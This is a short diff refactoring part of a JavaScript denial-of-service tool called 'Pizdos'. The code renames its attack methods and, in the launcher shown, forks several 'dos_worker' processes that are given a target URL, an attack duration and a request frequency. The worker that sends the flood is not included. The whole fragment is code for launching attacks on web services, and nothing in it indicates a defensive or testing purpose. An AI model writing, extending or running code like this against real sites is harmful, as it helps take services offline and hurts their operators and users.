@@ -8,20 +8,20 @@ class Pizdos {
     /**
      * Starts attack on url using options.
      * @param {string} url 
-     * @param {object} userOptions 
+     * @param {Object} options 
      */
-    static startAttack(url, userOptions) {
+    static attack(url, options) {
         fs.readFile('./config/standart-options.json',
                     'utf8',
                     (err, data) => {
             if (err) throw err
             
-            const options = Object.assign(JSON.parse(data), userOptions)
+            const o = Object.assign(JSON.parse(data), options)
 
-            this.attack(url,
-                    options.processesCount,
-                    options.attackDuration,
-                    options.requestsFrequency)
+            this.startAttackProcesses(url,
+                                      o.processesCount,
+                                      o.attackDuration,
+                                      o.requestsFrequency)
         })
     }
 
@@ -33,7 +33,7 @@ class Pizdos {
      * @param {number} duration 
      * @param {number} frequency 
      */
-    static attack(url, processesCount, duration, frequency) {
+    static startAttackProcesses(url, processesCount, duration, frequency) {
         console.log('Attack is started.')
         for (let i = 1; i <= processesCount; i++) {
             cp.fork('./src/dos_worker', [url, duration, frequency, i])
